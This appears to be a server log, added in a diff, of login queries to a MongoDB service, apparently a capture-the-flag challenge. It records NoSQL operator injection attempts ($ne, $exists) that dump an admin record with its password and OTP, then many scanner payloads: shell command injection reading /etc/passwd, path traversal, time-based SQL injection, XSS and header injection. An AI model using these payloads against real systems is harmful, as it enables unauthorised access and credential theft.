+Query: {'username': u'1', 'auth': {u'otp': u'', u'password': u'1'}}
+None
+Query: {'username': u'admin', 'auth': {u'auth': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'12345', u'password': u'quang'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123123', u'password': u'asadalsjda'}}
+None
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {u'password': u''}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {u'password': u''}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, 1]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {u'1': 1}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'12345', u'password': u'quang'}, {u'1': 1}]}}
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'$or': [{u'otp': u'1234', u'password': u'admin'}, {}]}}
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'1234', u'password': u'admin'}, {}]}}
+Query: {'username': u'admin', 'auth': {u'$and': [{u'otp': u'1234', u'password': u'admin'}, {}]}}
+Query: {'username': u'admin', 'auth': {u'||': [{u'otp': u'1234', u'password': u'admin'}, {}]}}
+None
+Query: {'username': u'admin', 'auth': {u'|': [{u'otp': u'1234', u'password': u'admin'}, {}]}}
+None
+Query: {'username': u'admin', 'auth': {u'$or': [{u'otp': u'1234', u'password': u'admin'}, {u'1': u'1'}]}}
+Query: {'username': u'admin', 'auth': {u'$not': u'/^p.*/'}}
+Query: {'username': u'admin', 'auth': {u'password': {u'$not': {u'$gt': 1}}}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$exists': True}}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$exists': True}}}
+None
+Query: {'username': u'admin', 'auth': {u'$exists': True}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$exists': True}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'1111', u'password': u'1111111'}}
+None
+Query: {'username': u'admin', 'auth': {u'$exists': True}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!'}}
+None
+Query: {'username': u'admin@admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'$exists', 'auth': {u'otp': u'', u'password': u'true'}}
+None
+Query: {'username': u'admin', 'auth': {u'$exist': True}}
+Query: {'username': u'admin', 'auth': {u'$exists': True}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'pab', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'213213213', 'auth': {u'otp': u'2321', u'password': u'asdsad'}}
+None
+Query: {'username': u'ok', 'auth': {u'otp': u'ok', u'password': u'ok'}}
+None
+Query: {'username': u'dxvx', 'auth': {u'otp': u'dfs', u'password': u'dfsfs'}}
+None
+Query: {'username': u'admin', 'auth': {u'$exists': True}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'a', 'auth': {u'otp': u'1', u'password': u'a'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1337', u'password': u'$up3rP455w0rd!|'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'233', u'password': u'admin'}}
+None
+Query: {'username': u'kai', 'auth': {u'otp': u'122', u'password': u'kais'}}
+None
+Query: {'username': u'kai', 'auth': {u'otp': u'122', u'password': u'kais'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'122', u'password': u'kais'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'122', u'password': u'kais'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'dt', 'auth': {u'otp': u'3232', u'password': u'dfdf'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'amdin', 'auth': {u'otp': u'123456', u'password': u'admin'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'12345', u'password': u'guest'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'aaaa', 'auth': {u'otp': u'11111', u'password': u'aaaaa'}}
+None
+Query: {'username': u'admin', 'auth': {u'$exists': True}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'123', 'auth': {u'otp': u'123', u'password': u'1231'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123456', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin'}}
+None
+Query: {'username': u"admin'})//", 'auth': {u'otp': u'1234', u'password': u"admin'})//"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin" or 1=1"}}//'}}
+None
+Query: {'username': u'veepgqjb', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'umbnfivy', 'auth': u'&cat /etc/passwd&'}
+None
+Query: {'username': u'bdxdcoqc', 'auth': 268435455}
+None
+Query: {'username': u'ntkjlovi', 'auth': u'+response.write(9945466*9228777)+'}
+None
+Query: {'username': u'rurhrumq', 'auth': 1}
+None
+Query: {'username': u'rurhrumq', 'auth': 1}
+None
+Query: {'username': u'bdxdcoqc', 'auth': inf}
+None
+Query: {'username': u'umbnfivy', 'auth': u';cat /etc/passwd;'}
+None
+Query: {'username': u'umbnfivy', 'auth': u'&dir&'}
+None
+Query: {'username': u'vhetafcv', 'auth': u';print(md5(acunetix_wvs_security_test));$a='}
+None
+Query: {'username': u'drflwspl', 'auth': u'+response.write(9195003*9983717)+'}
+None
+Query: {'username': u'response.write(9752930*9995261)', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"'+response.write(9752930*9995261)+'", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'"+response.write(9752930*9995261)+"', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'tasianxq', 'auth': u'&cat /etc/passwd&'}
+None
+Query: {'username': u'\r\n SomeCustomInjectedHeader:injected_by_wvs', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\n SomeCustomInjectedHeader:injected_by_wvs', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\r SomeCustomInjectedHeader:injected_by_wvs', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'rnwdowkq', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'umvlivqk', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'rnwdowkq', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'${100088+99535}', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'XCxa91NY', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'umvlivqk', 'auth': 268435455}
+None
+Query: {'username': u'if(now()=sysdate(),sleep(9),0)/*\'XOR(if(now()=sysdate(),sleep(9),0))OR\'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'ZHVzaURVS3o=', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'(select(0)from(select(sleep(9)))v)/*\'+(select(0)from(select(sleep(9)))v)+\'"+(select(0)from(select(sleep(9)))v)+"*/', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"pYUdmKRt'; waitfor delay '0:0:3' -- ", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'umvlivqk', 'auth': inf}
+None
+Query: {'username': u'tasianxq', 'auth': u';cat /etc/passwd;'}
+None
+Query: {'username': u"5gSJeJuy'); waitfor delay '0:0:3' -- ", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'ihdrncte&n956441=v979588', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?%00.jpg', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"hpaFPxdF')); waitfor delay '0:0:3' -- ", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'1some_inexistent_file_with_long_name%00.jpg', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'umvlivqk', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"AeUCZOkV';select pg_sleep(6); -- ", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'http://testasp.vulnweb.com/t/fit.txt?%00.jpg', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'268435455', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'testasp.vulnweb.com', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\ufffdh', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"JZFhOHuM');select pg_sleep(6); -- ", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u')', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'tasianxq', 'auth': u'&dir&'}
+None
+Query: {'username': u'!(()&&!|*|*|', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'..\ufffd\ufffd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"txAd6n1w'));select pg_sleep(6); -- ", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'1e309', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'^(#$!@#$)(()))******', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\'"()', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\'"\\\'\\");|]*{\r\n<\x00>\ufffd\'\'', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'http://testasp.vulnweb.com/t/xss.html?%00.jpg', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'&cat /etc/passwd&', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'lntqtinv', 'auth': u';print(md5(acunetix_wvs_security_test));$a='}
+None
+Query: {'username': u"'&cat /etc/passwd&'", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'"&cat /etc/passwd&"', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\ncat /etc/passwd\n', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'http://hitdHOaQfuai7.bxss.me/', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'`cat /etc/passwd`', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'|cat /etc/passwd#', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u';print(md5(acunetix_wvs_security_test));', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"';print(md5(acunetix_wvs_security_test));$a='", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'xmhpomqo', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"'|'ld", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'acunetix_wvs_invalid_filename', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'";print(md5(acunetix_wvs_security_test));$a="', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'"|"ld', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u';cat /etc/passwd;', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'login', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'${@print(md5(acunetix_wvs_security_test))}', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'../../../../../../../../../../etc/passwd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"';cat /etc/passwd;'", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'http://www.acunetix.tst', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'login\x00', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'pillckeu', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'";cat /etc/passwd;"', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'../../../../../../../../../../etc/passwd\x00.jpg', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'${@print(md5(acunetix_wvs_security_test))}\\', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'1\'"', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\'"', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'||cat /etc/passwd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'login/.', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\\', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'<!--', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'&dir', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'1\ufffd\x00xa7\ufffd\ufffd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"'&dir&'", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'ubtydxme\'"()&%<ScRiPt >prompt(913592)</ScRiPt>', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'/../..//../..//../..//../..//../..//etc/passwd\x00.jpg', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'@@a6PbH', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'"&dir&"', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\'"()&%<ScRiPt >prompt(944954)</ScRiPt>', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'|dir', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'ubtydxme_932313', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'JyI=', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'/etc/passwd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u"'|dir", 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\ufffd\'\ufffd"', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'"|dir', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\ufffd\'\'\ufffd""', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'..\ufffd\ufffd..\ufffd\ufffd..\ufffd\ufffd..\ufffd\ufffd..\ufffd\ufffd..\ufffd\ufffd..\ufffd\ufffd..\ufffd\ufffdetc/passwd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'file:///etc/passwd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'/\\../\\../\\../\\../\\../\\../\\../etc/passwd', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'WEB-INF/web.xml', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'WEB-INF\\web.xml', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'../../../../../../../../../../windows/win.ini', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'../../../../../../../../../../boot.ini', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'../../../../../../../../../../windows/win.ini\x00.jpg', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdwindows\ufffd\ufffdwin.ini', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'................windowswin.ini', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'/.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./windows/win.ini', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini', 'auth': {u'otp': u'e', u'password': u'e'}}
+None
+Query: {'username': u'unexisting/../../../../../../../../../../windows/win.ini.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\